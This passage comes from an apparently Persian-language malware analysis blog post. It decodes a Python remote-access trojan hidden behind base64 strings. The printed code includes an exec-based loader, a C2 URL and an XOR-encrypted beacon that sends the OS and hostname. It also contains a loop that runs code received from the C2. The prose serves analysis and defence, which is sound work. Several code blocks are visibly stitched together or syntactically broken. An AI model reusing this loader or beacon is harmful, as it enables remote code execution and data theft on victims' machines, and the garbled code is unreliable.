+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sdat</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>error_de</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=n>sdat</span><span class=o>==</span><span class=s2>&#34;&#34;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>sdat</span> <span class=o>=</span> <span class=n>is_url_valid</span><span class=p>(</span><span class=n>sdat</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>kerrs</span> <span class=o>=</span> <span class=n>sdat</span> <span class=o>+</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=s2>&#34;Cg==&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=n>din_dat</span> <span class=o>==</span> <span class=s2>&#34;Error&#34;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>kerrs</span> <span class=o>=</span> <span class=s2>&#34;Error&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=n>din_dat</span> <span class=o>==</span> <span class=s2>&#34;valid&#34;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>kerrs</span> <span class=o>+=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=s2>&#34;valid&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>kerrs</span> <span class=o>+=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>din_dat</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=n>kerrs</span> <span class=o>==</span> <span class=s2>&#34;none&#34;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>kerrs</span> <span class=o>=</span> <span class=n>extract_url_domain</span><span class=p>(</span><span class=s2>&#34;valid&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>szParentDir</span> <span class=o>=</span> <span class=n>Path</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=n>szFileDirPath</span> <span class=o>=</span> <span class=n>szParentDir</span><span class=o>.</span><span class=n>parent</span>
+</span></span><span class=line><span class=cl><span class=n>szFilePath</span> <span class=o>=</span> <span class=n>szFileDirPath</span><span class=o>.</span><span class=fm>__str__</span><span class=p>()</span> <span class=o>+</span> <span class=s2>&#34;/requirements.txt&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>szFilePath</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>sztext</span> <span class=o>=</span> <span class=n>file</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sztext</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>exec</span><span class=p>(</span><span class=n>kerrs</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>دوباره دوتا متغیر داریم که با base64 انکد شدن. متغیرهای <strong>error_de</strong> و <strong>din_dat</strong> رو دیکدشون کنیم ببینیم چه خبره:</p><p>اول میریم سراغ error_de:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> -n <span class=s2>&#34;YUtPID0gImFkZndlZndlZndlIg0K\
+</span></span></span><span class=line><span class=cl><span class=s2>dXJsID0gImh0dHBzOi8vc2VhcmNoYm94LmluZm8vcHJlZmVyLnBocCINCg0K&#34;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=p>|</span> base64 -d
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>aKO</span> <span class=o>=</span> <span class=s2>&#34;adfwefwefwe&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>url</span> <span class=o>=</span> <span class=s2>&#34;https://searchbox.info/prefer.php&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>خب به به آدرس C2 ش مشخص شد. و حالا din_dat:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=err>$</span> <span class=n>echo</span> <span class=o>-</span><span class=n>n</span> <span class=s2>&#34;</span><span class=se>\
+</span></span></span><span class=line><span class=cl><span class=s2>dHJhY2UgPSAiaWlubmlvb2lvam5uYXdlZm9…</span><span class=se>\
+</span></span></span><span class=line><span class=cl><span class=s2>LnNsZWVwKDIwKQ0K</span><span class=se>\
+</span></span></span><span class=line><span class=cl><span class=s2>a2JlcHMgPSAid2VlZyI=&#34;</span> \
+</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>base64</span> <span class=o>-</span><span class=n>d</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>trace</span> <span class=o>=</span> <span class=s2>&#34;iinniooiojnnawefoijonvbz1azxsdwwaaqzvw234ewxcvnoprtwqxv&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>Key</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>([</span><span class=mi>3</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>9</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>5</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>GetObjID</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span><span class=p>)</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>12</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>GetOSString</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>platform</span><span class=o>.</span><span class=n>platform</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>szObjectID</span> <span class=o>=</span> <span class=n>GetObjID</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>szPCode</span> <span class=o>=</span> <span class=s2>&#34;Operating System : &#34;</span> <span class=o>+</span> <span class=n>GetOSString</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>szComputerName</span> <span class=o>=</span> <span class=s2>&#34;Computer Name : &#34;</span> <span class=o>+</span> <span class=n>socket</span><span class=o>.</span><span class=n>gethostname</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>xor_encrypt_decrypt</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>key</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)):</span>
+</span></span><span class=line><span class=cl>        <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=n>key</span><span class=p>[</span><span class=n>i</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>key</span><span class=p>)])</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_bytes_from_unicode</span><span class=p>(</span><span class=n>text</span><span class=p>,</span> <span class=n>encoding</span> <span class=o>=</span> <span class=s1>&#39;utf-16le&#39;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>text</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=n>encoding</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>HTTP_POST</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>user_agent</span> <span class=o>=</span> <span class=s2>&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>encoded_data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>context</span> <span class=o>=</span> <span class=n>ssl</span><span class=o>.</span><span class=n>_create_unverified_context</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>n_request</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>Request</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>encoded_data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>n_request</span><span class=o>.</span><span class=n>add_header</span><span class=p>(</span><span class=s1>&#39;User-Agent&#39;</span><span class=p>,</span> <span class=n>user_agent</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>urlopen</span><span class=p>(</span><span class=n>n_request</span><span class=p>,</span> <span class=n>context</span><span class=o>=</span><span class=n>context</span><span class=p>,</span> <span class=n>timeout</span> <span class=o>=</span> <span class=mi>60</span><span class=p>)</span> <span class=k>as</span> <span class=n>response</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>response</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>MakeRequestPacket</span><span class=p>(</span><span class=n>szContents</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>szCID</span> <span class=o>=</span> <span class=s2>&#34;FD429DEABE&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>szStep</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\r\n\t\t</span><span class=s2>Step1 : KeepLink(P)</span><span class=se>\r\n</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>lszRequest</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>lpRequest</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>lpRequestEnc</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>szContents</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>szData</span> <span class=o>=</span> <span class=n>szStep</span> <span class=o>+</span> <span class=n>szPCode</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=n>szComputerName</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=n>szContents</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>szData</span> <span class=o>=</span> <span class=n>szContents</span>
+</span></span><span class=line><span class=cl>    <span class=n>lszRequest</span> <span class=o>=</span> <span class=s2>&#34;id=&#34;</span> <span class=o>+</span> <span class=n>szCID</span> <span class=o>+</span> <span class=s2>&#34;&amp;oid=&#34;</span> <span class=o>+</span> <span class=n>szObjectID</span> <span class=o>+</span> <span class=s2>&#34;&amp;data=&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>lpRequest</span> <span class=o>=</span> <span class=n>get_bytes_from_unicode</span><span class=p>(</span><span class=n>szData</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>lpRequestEnc</span> <span class=o>=</span> <span class=n>xor_encrypt_decrypt</span><span class=p>(</span><span class=n>lpRequest</span><span class=p>,</span><span class=n>Key</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>szb64Data</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>lpRequestEnc</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>lszRequest</span> <span class=o>+=</span> <span class=n>szb64Data</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>lszRequest</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>encrypt_decrypt</span><span class=p>(</span> <span class=n>Key</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>block_copy</span><span class=p>(</span><span class=n>lpContent</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>lpCmdID</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>block_copy</span><span class=p>(</span><span class=n>lpContent</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=n>lpDataLen</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>nCMDID</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;&lt;i&#39;</span><span class=p>,</span><span class=n>lpCmdID</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=n>nDataLen</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;&lt;i&#39;</span><span class=p>,</span><span class=n>lpDataLen</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=n>lpData</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=n>nDataLen</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>block_copy</span><span class=p>(</span><span class=n>lpContent</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=n>lpData</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>nDataLen</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>lpData</span> <span class=o>=</span> <span class=n>encrypt_decrypt</span><span class=p>(</span><span class=n>lpData</span><span class=p>,</span> <span class=mi>123</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>szCode</span> <span class=o>=</span> <span class=n>lpData</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1>#szCodeArr[0] = szCode</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>nCMDID</span> <span class=o>==</span> <span class=mi>1001</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>exec</span><span class=p>(</span><span class=n>szCode</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>continue</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>nCMDID</span> <span class=o>==</span> <span class=mi>1002</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>60</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>continue</span>
+</span></span><span class=line><span class=cl>        <span class=k>continue</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>continue</span>
+</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>20</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>kbeps</span> <span class=o>=</span> <span class=s2>&#34;weeg&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>از din_dat هم منطق اصلی RAT پیدا شد. بریم که توی چند تا بخش بررسیش کنیم.</p><h3 id=ثابت-ها-و-آماده-سازی><strong>ثابت ها و آماده سازی</strong></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>trace</span> <span class=o>=</span> <span class=s2>&#34;iinniooiojnnawefoijonvbz1azxsdwwaaqzvw234ewxcvnoprtwqxv&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>Key</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>([</span><span class=mi>3</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>9</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>5</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>GetObjID</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span><span class=p>)</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>12</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>GetOSString</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>platform</span><span class=o>.</span><span class=n>platform</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>szObjectID</span> <span class=o>=</span> <span class=n>GetObjID</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>szPCode</span> <span class=o>=</span> <span class=s2>&#34;Operating System : &#34;</span> <span class=o>+</span> <span class=n>GetOSString</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>szComputerName</span> <span class=o>=</span> <span class=s2>&#34;Computer Name : &#34;</span> <span class=o>+</span> <span class=n>socket</span><span class=o>.</span><span class=n>gethostname</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>ظاهرا رشته‌ی trace صرفا نقش تزئینی داره و در ادامه استفاده‌ی مؤثری ازش نمیشه. توی متغیر Key کلید ۱۶بایتی برای XOR و رمز کردن داده‌ها برای ارسال درخواست به C2 و رمزگشایی پاسخ دریافتی از C2 بکار میره. </p><p>تابع GetObjID هر بار که فراخونی بشه یه شناسه‌ی ۱۲حرفی تصادفی می‌سازه که توی پارامتر oid درخواست‌ها میاد و نشست‌ها رو از  هم دیگه تفکیک می‌کنه. تابع GetOSString  اسم و مشخصات سیستم‌عامل رو برمی‌گردونه تا احتمالا بعدا توی تله‌متری استفاده بشه. مقدار szObjectID هم همون شناسه‌ی تصادفی و یکتای این چرخه‌ست.</p><h3 id=توابع-رمزنگاری-و-کمکی><strong>توابع رمزنگاری و کمکی</strong></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>xor_encrypt_decrypt</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>key</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)):</span>
+</span></span><span class=line><span class=cl>        <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=n>key</span><span class=p>[</span><span class=n>i</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>key</span><span class=p>)])</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_bytes_from_unicode</span><span class=p>(</span><span class=n>text</span><span class=p>,</span> <span class=n>encoding</span> <span class=o>=</span> <span class=s1>&#39;utf-16le&#39;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>text</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=n>encoding</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>encrypt_decrypt</span><span class=p>(</span> <span class=n>szRequest</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>szResponse</span> <span class=o>=</span> <span class=n>szResponse</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span> <span class=s1>&#39;+&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>szResponse</span> <span class=o>==</span> <span class=s2>&#34;Succeed!&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>20</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>continue</span>
+</span></span><span class=line><span class=cl>        <span class=n>lpContentEnc</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>szResponse</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>lpContent</span> <span class=o>=</span> <span class=n>xor_encrypt_decrypt</span><span class=p>(</span><span class=n>lpContentEnc</span><span class=p>,</span> <span class=n>Key</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>block_copy</span><span class=p>(</span><span class=n>lpContent</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>lpCmdID</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>block_copy</span><span class=p>(</span><span class=n>lpContent</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=n>lpDataLen</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>nCMDID</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;&lt;i&#39;</span><span class=p>,</span><span class=n>lpCmdID</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=n>nDataLen</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;&lt;i&#39;</span><span class=p>,</span><span class=n>lpDataLen</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=n>lpData</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=n>nDataLen</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>block_copy</span><span class=p>(</span><span class=n>lpContent</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=n>lpData</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>nDataLen</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>lpData</span> <span class=o>=</span> <span class=n>encrypt_decrypt</span><span class=p>(</span><span class=n>lpData</span><span class=p>,</span> <span class=mi>123</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>szCode</span> <span class=o>=</span> <span class=n>lpData</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
